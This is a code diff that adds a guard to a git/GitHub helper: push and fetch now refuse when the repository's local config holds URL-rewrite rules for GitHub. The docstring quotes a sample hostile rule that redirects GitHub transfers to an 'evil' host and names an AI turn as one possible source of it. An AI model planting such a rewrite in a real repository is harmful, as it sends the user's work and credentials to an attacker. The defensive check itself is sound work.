@@ -261,6 +261,45 @@ _OFFLINE_MARKERS = (
 )
 
 
+def url_rewrites(root: str, url: str | None = None) -> list[str]:
+    """The repo's OWN `url.<x>.insteadOf` / `pushInsteadOf` rules that could
+    re-point a GitHub transfer from `root` — `[]` when there are none.
+
+    THE GUARD (r05). Global/system config is already off for GitHub
+    transfers (`git_net_env`), but `.git/config` is not ours: anything
+    running in the app folder (the app, a Claude turn, a README's
+    instructions) can write `url.https://evil/.insteadOf=https://github.com/`
+    and every push of Bob's work — with his GitHub credential helper attached
+    — would go there. A rule counts when its prefix mentions github.com, or
+    is a prefix of `url` (the fake's file paths included). Read with
+    `--local --includes`, so a local `[include]` cannot hide one; the
+    command-scope rules tests use (GIT_CONFIG_COUNT) are not local and do not
+    count. `push`/`fetch` refuse when this is non-empty; follow.fetch's
+    fallback should ask it too."""
+    res = _git(root, "config", "--local", "--includes", "--get-regexp",
+               r"^url\..*\.(insteadof|pushinsteadof)$", env=_local_env(), timeout=10)
+    if res is None or res.returncode not in (0, 1):
+        return []
+    hits = []
+    for line in (res.stdout or "").splitlines():
+        key, _, value = line.partition(" ")
+        prefix = value.strip()
+        if not prefix:
+            continue
+        if "github.com" in prefix.lower() or (url and url.startswith(prefix)):
+            hits.append(f"{key} = {prefix}")
+    return hits
+
+
+def _guard(root: str, url: str) -> None:
+    hits = url_rewrites(root, url)
+    if hits:
+        logger.warning("refusing a GitHub transfer from %s: its .git/config rewrites "
+                       "GitHub URLs: %s", root, "; ".join(hits))
+        raise GitHubError("forbidden", "This app's settings would send your changes "
+                                       "somewhere other than GitHub, so nothing was sent.")
+
+
 def push(root: str, sha: str, full: str, branch: str, *, force: bool = False,
          lease: str | None = None) -> None:
     """Push commit `sha` from the repo at `root` to `refs/heads/<branch>` of
@@ -276,6 +315,7 @@ def push(root: str, sha: str, full: str, branch: str, *, force: bool = False,
     if not _SHA_RE.match(sha or "") or not _BRANCH_RE.match(branch or ""):
         raise GitHubError("failed", detail=f"bad push args {sha!r} {branch!r}")
     url = clone_url(full)
+    _guard(root, url)
     target = f"refs/heads/{branch}"
     args = ["push", "--no-verify", "--quiet"]
     if lease is not None:
@@ -308,6 +348,7 @@ def fetch(root: str, full_or_url: str, *refspecs: str, timeout: float = FETCH_TI
     moves (`refs/fused/follow`) still wants the caller to hold the slot."""
     try:
         url = clone_url(full_or_url)
+        _guard(root, url)
     except GitHubError:
         return False
     res = _git(root, *git_net_args(), "-c", "gc.auto=0", "-c", "maintenance.auto=false",
